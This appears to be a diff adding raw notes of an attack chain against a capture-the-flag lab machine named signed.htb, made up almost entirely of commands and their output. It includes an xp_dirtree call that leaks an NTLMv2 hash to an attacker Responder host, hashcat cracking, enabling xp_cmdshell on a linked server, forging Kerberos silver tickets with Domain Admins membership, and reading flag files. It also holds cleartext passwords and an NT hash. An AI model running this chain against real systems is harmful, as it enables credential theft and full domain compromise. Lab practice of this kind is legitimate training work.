@@ -1,0 +1,102 @@
+scott / Sm230#C5NatH
+
+impacket-mssqlclient 'signed/scott:Sm230#C5NatH@signed.htb'
+
+
+sqsh -S signed.htb -U 'signed/scott' -P 'Sm230#C5NatH'
+
+
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+sudo responder -I tun0
+
+EXEC master..xp_dirtree '\\10.10.14.21\share\'
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.90
+[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:9ed8c0dee29c361f:3E3898EAAFA22EADB098243C5CDD4DC6:010100000000000080F18E95223CDC013D5517C14B962FF400000000020008004B0045005900310001001E00570049004E002D00480033004C005400540031003800470044005500540004003400570049004E002D00480033004C00540054003100380047004400550054002E004B004500590031002E004C004F00430041004C00030014004B004500590031002E004C004F00430041004C00050014004B004500590031002E004C004F00430041004C000700080080F18E95223CDC01060004000200000008003000300000000000000000000000003000008554389C6C75C9F6ADC6738E6F4B9A82C387D0213F8822317625597895733A810A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000
+
+hashcat -m 5600 ntlmv2_mssqlsvc /usr/share/wordlists/rockyou.txt 
+
+mssqlsvc/purPLE9795!@
+
+impacket-mssqlclient 'signed/mssqlsvc:purPLE9795!@@signed.htb' -windows-auth
+
+SELECT srvname, isremote FROM sysservers
+
+EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC01]
+
+EXEC ('EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;') AT [DC01]
+
+EXEC ('EXEC xp_cmdshell "whoami"') AT [DC01]
+
+sqsh -S signed.htb -U 'signed\mssqlsvc' -P 'purPLE9795!@'
+
+SELECT sp.name AS LoginName, slr.role_principal_id, spr.name AS ServerRole FROM sys.server_principals sp
+LEFT JOIN sys.server_role_members srm
+    ON sp.principal_id = srm.member_principal_id
+LEFT JOIN sys.server_principals spr
+    ON srm.role_principal_id = spr.principal_id
+WHERE sp.name = 'mssqlsvc';
+
+SELECT sp.name AS member_login, r.name AS server_role FROM sys.server_role_members rm JOIN sys.server_principals sp ON rm.member_principal_id = sp.principal_id JOIN sys.server_principals r  ON rm.role_principal_id   = r.principal_id WHERE sp.name = 'mssqlsvc';
+
+SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
+name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
+
+##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+
+##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+
+SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   
+
+-------------
+
+echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4
+
+impacket-lookupsid -hashes ':ef699384c3285c54128a3ee1ddb1a0cc' 'SIGNED/mssqlsvc@dc01.signed.htb' 0
+
+SELECT name, sid FROM sys.server_principals WHERE name = 'SIGNED\IT';
+
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
+
+def sid(h):
+    b = bytes.fromhex(h)
+    import struct
+    rev, cnt = b[0], b[1]
+    auth = struct.unpack('>Q', b'\x00\x00' + b[2:8])[0]
+    subs = [struct.unpack('<I', b[8+4*i:12+4*i])[0] for i in range(cnt)]
+    return "S-{}-{}".format(rev, auth) + ''.join(f"-{s}" for s in subs)
+
+print(sid("0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"))
+
+S-1-5-21-4088429403-1159899800-2753317549-1105
+
+S-1-5-21-4088429403-1159899800-2753317549
+
+
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc
+export KRB5CCNAME=mssqlsvc.ccache
+impacket-mssqlclient -k -no-pass DC01.signed.htb
+
+
+EXECUTE sp_configure 'show advanced options', 1
+
+EXECUTE sp_configure 'xp_cmdshell', 1
+
+xp_cmdshell "type c:\users\mssqlsvc\desktop\user.txt"
+
+---
+
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 512,1105 -user-id 1103 Administrator
+
+export KRB5CCNAME=Administrator.ccache
+
+impacket-mssqlclient -k -no-pass DC01.signed.htb
+
+EXEC sp_configure 'show advanced options', 1;
+EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
+
+SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
